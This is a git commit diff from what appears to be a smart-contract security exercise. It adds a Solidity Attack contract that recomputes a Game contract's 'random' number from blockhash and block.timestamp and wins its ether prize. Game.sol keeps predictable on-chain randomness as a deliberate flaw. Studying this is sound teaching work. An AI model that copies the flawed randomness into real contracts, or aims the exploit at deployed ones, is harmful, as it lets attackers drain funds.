e1992bcc89a3ab4b664eeca6d903c399adee7a98
Morten Bergseng <bergseng.m@gmail.com>
2022-05-30 13:02:58 +0200

    passing test

---
+++ contracts/Attack.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.4;
+
+import "./Game.sol";
+
+contract Attack {
+    Game game;
+
+    /**
+    Creates an instance of Game contract with the help of gameAddress
+     */
+    constructor(address gameAddress) {
+        game = Game(gameAddress);
+    }
+
+    /**
+    attacks the Game contract by guessing the exact number because blockhash and block.timestamp is
+    accessible publically
+     */
+
+    function attack() public {
+        uint256 _guess = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number), block.timestamp)
+            )
+        );
+        game.guess(_guess);
+    }
+
+    //Gets called when the contract recieves eth
+    receive() external payable {}
+}
--- contracts/Game.sol
+++ contracts/Game.sol
@@ -1,15 +1,16 @@
 // SPDX-License-Identifier: MIT
-
 pragma solidity ^0.8.4;
 
 contract Game {
     constructor() payable {}
 
-    // Randomly picks a number out of 0 to 2^256-1
+    /**
+          Randomly picks a number out of `0 to 2²⁵⁶–1`.
+      */
     function pickACard() private view returns (uint256) {
-        //'abi.encodePacked(arg); takes in the two params - blockhash and block.timestamp
-        // and returns a byte array which further gets passed into keccak256 which returns bytes 32
-        // which is further converted to a uint
+        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
+        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
+        // which is further converted to a `uint`.
         // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
         uint256 pickedCard = uint256(
             keccak256(
@@ -20,11 +21,10 @@ contract Game {
     }
 
     /**
-    It begins the game by first choosing a random number by calling pickACard
-    It then verifies if the random number selected is equal to "_guess" passed by the  player
-    If the player guessed the correct number, it sends the player 0.1 eth
-     */
-
+          It begins the game by first choosing a ramdom number by calling `pickACard`
+          It then verifies if the random number selected is equal to `_guess` passed by the player
+          If the player guessed the correct number, it sends the player `0.1 ether`
+      */
     function guess(uint256 _guess) public {
         uint256 _pickedCard = pickACard();
         if (_guess == _pickedCard) {
@@ -34,8 +34,8 @@ contract Game {
     }
 
     /**
-    Returns the balance of ether in the contract
-     */
+          Returns the balance of ether in the contract
+      */
     function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
